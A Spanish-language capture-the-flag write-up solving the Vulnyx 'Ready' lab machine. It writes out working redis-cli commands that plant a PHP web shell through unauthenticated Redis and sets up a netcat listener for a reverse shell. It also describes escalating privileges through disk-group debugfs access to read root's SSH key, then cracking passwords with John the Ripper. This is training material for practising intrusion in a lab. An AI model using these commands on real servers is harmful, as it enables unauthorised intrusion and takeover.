## Resolución de la máquina Ready de Vulnyx

### Escaneo Nmap
El primer paso fue realizar un escaneo con `nmap`, que reveló los siguientes puertos abiertos:

![Captura de pantalla 2024-10-10 191755](https://github.com/user-attachments/assets/e13d73db-567a-4ad7-9f60-eae0669ee4dc)

### Explotación del servicio Redis
Noté que Redis estaba mal configurado, permitiendo el acceso sin autenticación. Ejecuté los siguientes comandos para obtener acceso a la máquina:

```bash
❯ redis-cli -h 192.168.1.118
192.168.1.118:6379> config set dir /var/www/html
OK
192.168.1.118:6379> config set dbfilename cmd.php
OK
192.168.1.118:6379> set test "<?php system($_GET[cmd]); ?>"
OK
192.168.1.118:6379> save
OK
```

Esto me permitió generar un archivo `cmd.php` en el directorio accesible desde la web. A través de la URL, pude ejecutar comandos en el servidor y envié una reverse shell hacia mi terminal.

### Conexión a la máquina
En mi máquina local, me puse en escucha con `netcat` usando el puerto 444:

```bash
❯ nc -lnvp 444
```

Luego, accedí a la URL `http://192.168.1.118/cmd.php?cmd=<comando_shell>`, lo que inició la conexión reversa. Ahora tenía una shell en el servidor como el usuario **ben**.

![Captura de pantalla 2024-10-10 194457](https://github.com/user-attachments/assets/a793a293-7f11-4d5b-86a5-4f632f45952d)

![Captura de pantalla 2024-10-10 194512](https://github.com/user-attachments/assets/1af359dd-e79d-4664-80e0-f3437be07ad4)

### Primera flag
Una vez dentro de la máquina, exploré el directorio `/home/ben` y encontré la primera flag: `user.txt`. La leí y la guardé.

![Captura de pantalla 2024-10-10 194717](https://github.com/user-attachments/assets/8a0dc39c-24cc-4ff5-ad3e-33a64ea2df08)

### Escalada de privilegios
Al ejecutar el comando `id`, descubrí que el usuario **ben** pertenece al grupo `disk`, lo que significa que tiene privilegios de lectura y escritura en dispositivos de almacenamiento.

![Captura de pantalla 2024-10-10 202101](https://github.com/user-attachments/assets/c9249836-18b7-4e29-aee0-15af012c412f)

Utilicé el siguiente comando para listar las particiones:

```bash
❯ df -h
```

Luego, accedí al sistema de archivos utilizando `debugfs` para inspeccionar el dispositivo `/dev/sda1`:

```bash
❯ debugfs /dev/sda1
```

Navegando por el sistema de archivos con `debugfs`, encontré la clave RSA de root en `/root/.ssh/id_rsa`.

![Captura de pantalla 2024-10-10 202155](https://github.com/user-attachments/assets/9ea4eafc-e588-4222-80bb-645d77c98bcc)

### Obtener el acceso como root
Usé **John the Ripper** para craquear la contraseña de la clave privada RSA:

![Captura de pantalla 2024-10-10 202314](https://github.com/user-attachments/assets/7bee13e3-1239-49f5-90bb-1d167fa030c8)

Una vez obtenida la contraseña, inicié sesión como **root** utilizando la clave RSA y el siguiente comando:

![Captura de pantalla 2024-10-10 202552](https://github.com/user-attachments/assets/ef163a38-c6e8-4e81-9f18-4ef6c2908577)

### Flag final
Ya como root, encontré la flag final protegida dentro de un archivo comprimido en `/root`. El archivo estaba protegido por contraseña, pero nuevamente utilicé **John the Ripper** para craquear la contraseña del archivo `.zip`:

![Captura de pantalla 2024-10-10 203944](https://github.com/user-attachments/assets/1286d05a-2cdc-442f-a029-6569c5ded6d1)


Tras craquear la contraseña y descomprimir el archivo, obtuve la flag final.

![Captura de pantalla 2024-10-10 204024](https://github.com/user-attachments/assets/06d1ceac-c7cc-46b2-b88e-28b0d9b1a0d5)

¡Máquina pwned!
